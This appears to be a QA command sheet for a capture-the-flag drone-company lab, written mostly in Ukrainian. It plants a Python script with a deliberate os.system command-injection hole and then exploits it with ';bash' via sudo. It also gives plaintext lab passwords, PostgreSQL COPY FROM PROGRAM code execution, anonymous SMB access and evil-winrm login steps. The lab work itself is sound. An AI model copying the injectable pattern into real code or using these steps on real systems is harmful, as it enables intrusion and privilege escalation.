# QA Commands — SkyRift CTF

## Operator_station — виправлення Flag_5 (перезаписати скрипт)

```
cat > /opt/dronecorp/tools/flight_log_export.py << 'EOF'
#!/usr/bin/env python3
"""
DroneCorp — Flight Log Export Utility v1.2
Exports drone flight logs to the commander's export directory.
Usage: sudo -u commador /opt/dronecorp/tools/flight_log_export.py

# flag{Y0u_l1ke_privileges}
"""
import os
import sys

EXPORT_DIR = "/home/commador/exports"
LOG_DIR = "/var/log/dronecorp"

print("=== DroneCorp Flight Log Export Utility ===")
print(f"Log source : {LOG_DIR}")
print(f"Destination: {EXPORT_DIR}")
print()

log_name = input("Enter log filename to export (e.g. DRONE042_export.log): ").strip()

if not log_name:
    print("Error: no filename provided.")
    sys.exit(1)

cmd = f"cp {LOG_DIR}/{log_name} {EXPORT_DIR}/"
print(f"[*] Running: {cmd}")
os.system(cmd)
print("[+] Export complete.")
EOF
```

Видалити старий flag.txt:
```
sudo rm -f /home/commador/flag.txt
```

Перевірити:
```
cat /opt/dronecorp/tools/flight_log_export.py
```

---

## Flag_4 — SSH вхід (з Kali)

Якщо помилка "known_hosts" — спочатку:
```
ssh-keygen -f "/home/rangeadmin/.ssh/known_hosts" -R "192.168.125.55"
```

Підключення:
```
ssh -o HostKeyAlgorithms=+ssh-rsa operator@192.168.125.55
```
пароль: 3edcVFR456

Прапор:
```
cat ~/flag.txt
```

---

## Flag_5 — Читати вразливий скрипт

```
cat /opt/dronecorp/tools/flight_log_export.py
```

Запустити injection:
```
sudo -u commador /opt/dronecorp/tools/flight_log_export.py
```
Ввести: `;bash`

---

## Flag_6 — DB креди (від commador)

```
cat /home/commador/scripts/backup_db.sh
```

---

## Flag_6+7 — PostgreSQL (з Kali або commador)

Встановити psql якщо нема (Kali):
```
sudo apt-get install -f && sudo apt install -y postgresql-client-common
```

Встановити psql якщо нема (Ubuntu/Operator_station):
```
sudo apt install -y postgresql-client-14
```

Підключення:
```
psql -h 10.10.50.100 -U tech2 -d dronecorp_db
```
пароль: adfGt54DCf

RCE в psql:
```
CREATE TABLE cmd_exec (output text);
COPY cmd_exec FROM PROGRAM 'cat /var/lib/postgresql/flag.txt';
SELECT * FROM cmd_exec;
```

---

## Windows Server — виправлення Flag_8 (перенести у deploy_update.ps1)

Виконати на Windows Server (PowerShell як Administrator):
```
(Get-Content C:\DroneUpdates\deploy_update.ps1) -replace '# TODO: remove hardcoded password!', "# TODO: remove hardcoded password!`n# flag{sh4r3_1s_c4r3}" | Set-Content C:\DroneUpdates\deploy_update.ps1
```

Видалити окремий flag.txt:
```
Remove-Item C:\DroneUpdates\flag.txt
```

---

## Flag_8 — SMB анонімний доступ (з Kali)

Встановити smbclient якщо нема:
```
sudo apt install -y smbclient
```

```
smbclient -L //10.10.50.150 -N
```

```
smbclient //10.10.50.150/Updates -N
```

Всередині smbclient:
```
ls
get deploy_update.ps1
exit
```

---

## Flag_9+10 — Windows WinRM (з Operator_station, commador shell)

Встановити evil-winrm якщо нема:
```
sudo gem install evil-winrm
```

```
evil-winrm -i 10.10.50.150 -u svc_deploy -p "Deploy@2024!Drone"
```

Знайти сервіс:
```
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
```

Перевірити права:
```
icacls "C:\Program Files"
```

Flag_10 з SYSTEM:
```
reg query HKLM\SOFTWARE\DroneCorp\UpdateSync
```

---

## Update Server — фінал

```
ssh -o HostKeyAlgorithms=+ssh-rsa grayraven@192.168.125.55
```
пароль: grayraven124
